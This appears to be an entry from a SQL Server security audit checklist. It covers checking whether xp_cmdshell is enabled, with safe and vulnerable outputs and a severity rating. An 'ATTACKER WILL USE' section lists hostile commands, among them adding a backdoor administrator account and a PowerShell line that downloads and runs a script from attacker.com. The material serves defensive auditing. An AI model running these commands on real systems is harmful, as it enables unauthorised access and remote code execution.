1. XP_CMDSHELL - OS COMMAND EXECUTION (RCE)
================================================================

COMMAND:
SELECT name, value_in_use 
FROM sys.configurations 
WHERE name = 'xp_cmdshell';

PURPOSE: Check if OS command execution is possible

SAFE OUTPUT:
name        | value_in_use
------------|-------------
xp_cmdshell | 0

SAFE DESCRIPTION: 
xp_cmdshell is disabled. Attacker cannot execute OS commands directly.

VULNERABLE OUTPUT:
name        | value_in_use
------------|-------------
xp_cmdshell | 1

VULNERABLE DESCRIPTION:
xp_cmdshell is ENABLED. Attacker can execute any OS command with SQL Server 
service account privileges.

ATTACKER WILL USE:
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'ipconfig /all';
EXEC xp_cmdshell 'net user hacker P@ssw0rd /add';
EXEC xp_cmdshell 'net localgroup administrators hacker /add';
EXEC xp_cmdshell 'powershell -c "Invoke-Expression (New-Object Net.WebClient).DownloadString(''http://attacker.com/ps.ps1'')"';

SEVERITY: CRITICAL
IMPACT: Full OS compromise, Domain takeover possible if service account is privileged
